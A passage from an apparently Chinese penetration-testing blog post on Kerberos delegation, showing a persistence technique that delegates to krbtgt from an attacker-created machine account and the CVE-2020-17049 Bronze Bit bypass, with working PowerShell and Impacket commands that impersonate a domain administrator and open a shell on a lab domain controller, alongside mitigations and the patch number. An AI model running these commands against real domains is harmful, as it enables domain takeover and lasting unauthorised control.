0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:利用基于资源的约束性委派打造变种黄金票据" class="headings">利用基于资源的约束性委派打造变种黄金票据</a></h4>
<p>当拿到域控后，需要做权限维持，假设服务 B 为 krbtgt，服务 A 为我们控制的一个账号。配置服务 A 到服务 B 的基于资源的约束性委派， 那么我们控制的账户就可以获取 KDC (Key Distribution Centre) 服务的 ST 服务票据（也就是 TGT 认购权证）。于是我们就可以伪造任何权限用户的 TGT 认购权证，就相当于打造了一个变种的黄金票据。</p>
<p>利用 <a href="https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1" target="_blank" rel="noopener">Powermad.ps1</a> 脚本新建一个密码为 test3 的机器账号，密码为 test</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">Powermad</span><span class="p">.</span><span class="n">ps1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">New-MachineAccount</span> <span class="n">-MachineAccount</span> <span class="n">test3</span> <span class="n">-Password</span> <span class="p">$(</span><span class="nb">ConvertTo-SecureString</span> <span class="s2">&#34;test&#34;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">)</span>
</span></span></code></pre></div><p>再配置 test3 到 krbtgt 的基于资源的约束性委派</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># 配置</span>
</span></span><span class="line"><span class="cl"><span class="nb">Set-ADUser</span> <span class="n">krbtgt</span> <span class="n">-PrincipalsAllowedToDelegateToAccount</span> <span class="n">test3</span><span class="p">$</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># 查询</span>
</span></span><span class="line"><span class="cl"><span class="nb">Get-ADUser</span> <span class="n">krbtgt</span> <span class="n">-Properties</span> <span class="n">PrincipalsAllowedToDelegateToAccount</span>
</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/202202222019508.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt="image-20220222201926278"></p>
<p>配置完成后，不管域管用户密码如何改变，我们都对该域有完全的控制权限。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo python3 getST.py -dc-ip 172.16.86.136 -spn krbtgt -impersonate administrator zjun.com/test3<span class="se">\$</span>:test
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>administrator.ccache
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">python3 smbexec.py -no-pass -k administrator@P-DC.zjun.com -dc-ip 172.16.86.136
</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/202202222025067.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt="image-20220222202531853"></p>
<h2 id="域委派攻击的防范措施"><a href="#域委派攻击的防范措施" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:域委派攻击的防范措施" class="headings">域委派攻击的防范措施</a></h2>
<ul>
<li>高权限的用户，设置不能被委派</li>
<li>主机账号需设置委派时，只能设置为约束性委派</li>
<li>Windows 2012 R2 及更高的系统建立了受保护的用户组，组内用户不允许被委派，这是有效的手段。受保护的用户组， 当这个组内的用户登录时（windows 2012 R2 域服务器，客户端必须为 Windows 8.1 或之上）不能使用 NTLM 认证；Kerberos 预认证时不能使用 DES 或者 RC4 等加密算法</li>
</ul>
<p>这样设置看起来可能安全了一些，但是也存在绕过。利用 Kerberos Bronze Bit (CVE-2020-17049) 这个逻辑漏洞实现。</p>
<p>KDC 对约束性委派和基于资源的约束性委派 (RBCD) 校验过程中对于通过 S4U2Self 请求的服务票据的验证过程如下：</p>
<p>KDC 首先会检查通过 S4U2Self 请求，请求的票据的 forwardable 标志位</p>
<ul>
<li>如果该位为 0，也就是不可转发，那么就会再验证是否是 RBCD
<ul>
<li>如果不是 RBCD，则不返回票据</li>
<li>如果是 RBCD，则再检查被委派的用户是否设置了不能被委派
<ul>
<li>如果设置了，则不返回票据</li>
<li>如果没设置，则返回票据</li>
</ul>
</li>
</ul>
</li>
<li>如果该位为 1，也就是可转发，那么就会再验证两者之间是否有委派配置
<ul>
<li>如果两者有委派配置，则返回票据</li>
<li>如果两者无委派配置，则不返回票据</li>
</ul>
</li>
</ul>
<p>CVE-2020-17049 这个漏洞就是利用这一点，请求过程中手动修改请求的票据的 forwardable 标志位为 1，从而绕过检查进行攻击。</p>
<p>如下域控中 administrator 用户设置「敏感用户，不能被委派」</p>
<p><img src="https://oss.zjun.info/zjun.info/202202222034055.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt="image-20220222203414115"></p>
<p>如果现在按照之前的命令去设置基于资源的约束性委派，就会不成功</p>
<p><img src="https://oss.zjun.info/zjun.info/202202222048997.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt="image-20220222204823691"></p>
<p><code>getST.py</code> 中有个 <code>-force-forwardable</code> 参数可以利用 CVE-2020-17049 漏洞来进行攻击。如下图成功获得 administrator 的 ST 服务票据</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo python3 getST.py -dc-ip 172.16.86.136 -spn krbtgt -impersonate administrator zjun.com/test3<span class="se">\$</span>:test -force-forwardable
</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/202202222051843.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt="image-20220222205137204"></p>
<p>要避免该问题还需要在此基础上打上 CVE-2020-17049 的漏洞补丁，补丁编号是：KB4598347，添加了一个票据签名，进行防篡改。</p>
<p>补丁地址：<a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-17049" target="_blank" rel="noopener">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-17049</a></p>
<h2 id="参考"><a href="#参考" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:参考" class="headings">参考</a></h2>
<ul>
<li><a href="https://www.bilibili.com/video/BV1564y1Y7HF" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1564y1Y7HF</a></li>
<li><a href="https://mp.weixin.qq.com/s/yqiqiY6fMd9gLokDYM4vRw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/yqiqiY6fMd9gLokDYM4vRw</a></li>
<li><a href="https://www.freebuf.com/articles/network/290860.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/290860.html</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/windows-server/security/kerberos/kerberos-constrained-delegation-overview" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows-server/security/kerberos/kerberos-constrained-delegation-overview</a></li>
<li><a href="https://y4er.com/post/kerberos-unconstrained-delegation/" target="_blank" rel="noopener">https://y4er.com/post/kerberos-unconstrained-delegation/</a></li>
<li><a href="https://shanfenglan.blog.csdn.net/article/details/108777247" target="_blank" rel="noopener">https://shanfenglan.blog.csdn.net/article/details/108777247</a></li>
<li><a href="https://daiker.gitbook.io/windows-protocol/kerberos/2" target="_blank" rel="noopener">https://daiker.gitbook.io/windows-protocol/kerberos/2</a></li>
<li><a href="https://shanfenglan.blog.csdn.net/article/details/110633298" target="_blank" rel="noopener">https://shanfenglan.blog.csdn.net/article/details/110633298</a></li>
<li><a href="https://mp.weixin.qq.com/s/JQNwQH6eJ2L04jz60M8hiw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/JQNwQH6eJ2L04jz60M8hiw</a></li>
<li><a href="https://xz.aliyun.com/t/7217" target="_blank" rel="noopener">https://xz.aliyun.com/t/7217</a></li>
<li><a href="https://www.cnblogs.com/mrhonest/p/14306539.html" target="_blank" rel="noopener">https://www.cnblogs.com/mrhonest/p/14306539.html</a></li>
<li><a href="https://blog.csdn.net/blue_fantasy/article/details/122601984" target="_blank" rel="noopener">https://blog.csdn.net/blue_fantasy/article/details/122601984</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9f44-e1453be7af5a" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9f44-e1453be7af5a</a></li>
<li><a href="https://xz.aliyun.com/t/7454" target="_blank" rel="noopener">https://xz.aliyun.com/t/7454</a></li>
<li><a href="https://y4er.com/post/kerberos-constrained-delegation/" target="_blank" rel="noopener">https://y4er.com/post/kerberos-constrained-delegation/</a></li>
<li><a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html" target="_blank" rel="noopener">https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html</a></li>
<li><a href="https://y4er.com/post/kerberos-resource-based-constrained-delegation/" target="_blank" rel="noopener">https://y4er.com/post/kerberos-resource-based-constrained-delegation/</a></li>
<li><a href="https://mp.weixin.qq.com/s/Ue2ULu8vxYHrYEalEzbBSw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Ue2ULu8vxYHrYEalEzbBSw</a></li>
</ul>

            </div>

            
    
    



        </article>

        

        


        


        


        
    
    
        <div class="related-posts">
            <h2 class="related-title">相关文章：</h2>
            <ul class="related-list">
                
                    <li class="related-item">
                        <a href="/2022/MS14-068.html" class="related-link">MS14-068 (CVE-2014-6324) 域提权漏洞分析</a>
                    </li>
                
                    <li class="related-item">
                        <a href="/2020/kerberos-protocol-to-ticket-forgery.html" class="related-link">Kerberos 协议到票据伪造</a>
                    </li>
                
                    <li class="related-item">
                        <a href="/2020/ntlm-authentication-to-pth-attack.html" class="related-link">NTLM 认证协议到 Pass The Hash 攻击</a>
                    </li>
                
                    <li class="related-item">
                        <a href="/2020/from-windows-local-authentication-to-obtaining-hash.html" class="related-link">由 Windows 本地认证到 Hash 抓取</a>
                    </li>
                
                    <li class="related-item">
                        <a href="/2022/CVE-2022-0543.html" class="related-link">CVE 2022 0543 Redis Lua 沙盒逃逸 RCE</a>
                    </li>
                
            </ul>
        </div>
    



        


        
    <footer class="minimal-footer">
        
            <div class="post-tag"><a href="/tags/%E5%A7%94%E6%B4%BE/" rel="tag" class="post-tag-link">#委派</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag" class="post-tag-link">#域渗透</a> <a href="/tags/windows/" rel="tag" class="post-tag-link">#windows</a> <a href="/tags/kerberos/" rel="tag" class="post-tag-link">#kerberos</a> <a href="/tags/ntlm-relay/" rel="tag" class="post-tag-link">#ntlm-relay</a> <a href="/tags/pass-the-ticket/" rel="tag" class="post-tag-link">#pass-the-ticket</a> <a href="/tags/cve-2019-1040/" rel="tag" class="post-tag-link">#cve-2019-1040</a></div>
        
        
        
            
                <div class="post-category">
                    <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="post-category-link">网络安全</a>
                </div>
            
        
    </footer>



        


        
    
        
        
    
    
    
    
        <ul class="post-nav">
            
                <li class="post-nav-prev">
                    <a href="/2022/bypass-domain-sensitive-group-acl-information-query.html" rel="prev">&lt; Bypass 域敏感组访问控制信息查询</a>
                </li>
            
            
                <li class="post-nav-next">
                    <a href="/2022/password-reading-and-keyboard-recording.html" rel="next">内网信息搜集密码读取和键盘记录 &gt;</a>
                </li>
            
        </ul>
    



        
    

        
            <div class="load-comments">
                <div id="load-comments">加载评论</div>
            </div>
        

        

        

        
            <div id="utterances"></div>
        

        
    



    </div>
</main>


            
    <div id="back-to-top" class="back-to-top">
        <a href="#"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon arrow-up"><path d="M34.9 289.5l-22.2-22.2c-9.4-9.4-9.4-24.6 0-33.9L207 39c9.4-9.4 24.6-9.4 33.9 0l194.3 194.3c9.4 9.4 9.4 24.6 0 33.9L413 289.4c-9.5 9.5-25 9.3-34.3-.4L264 168.6V456c0 13.3-10.7 24-24 24h-32c-13.3 0-24-10.7-24-24V168.6L69.2 289.1c-9.3 9.8-24.8 10-34.3.4z"/></svg></a>
    </div>


            
    <footer id="footer" class="footer">
        <div class="footer-inner">
            <div class="site-info">©&nbsp;2019–2022&nbsp;zjun</div>

            


            
        </div>
    </footer>


        </div>
        <script>
        if ('serviceWorker' in navigator) {
            window.addEventListener('load', function() {
                navigator.serviceWorker.register('\/sw.js');
            });
        }
    </script>


        






    

        

        

        
            <script>
    function loadComments() {
        (function() {
            var utterances = document.getElementById("utterances");
            var script = document.createElement('script');
            script.src = 'https://utteranc.es/client.js';
            script.async = true;
            script.crossOrigin = 'anonymous';
            script.setAttribute('repo', 'z1un\/blog.zjun.info');
            script.setAttribute('issue-term', 'title');
            const isDark = getCurrentTheme() === 'dark';
        if (isDark) {
            script.setAttribute('theme', 'photon-dark');
        } else {
            script.setAttribute('theme', 'github-light');
        }
            
            utterances.appendChild(script);
        })();
    }
</script>
        

        

    



    <script src="https://cdn.jsdelivr.net/npm/medium-zoom@latest/dist/medium-zoom.min.js"></script>

<script>
    let imgNodes = document.querySelectorAll('div.post-body img');
    imgNodes = Array.from(imgNodes).filter(node => node.parentNode.tagName !== "A");

    mediumZoom(imgNodes, {
        background: 'hsla(var(--color-bg-h), var(--color-bg-s), var(--color-bg-l), 0.95)'
    })
</script>




    <script src="https://cdn.jsdelivr.net/npm/instant.page@5.1.0/instantpage.min.js" type="module" defer></script>







    </body>
</html>
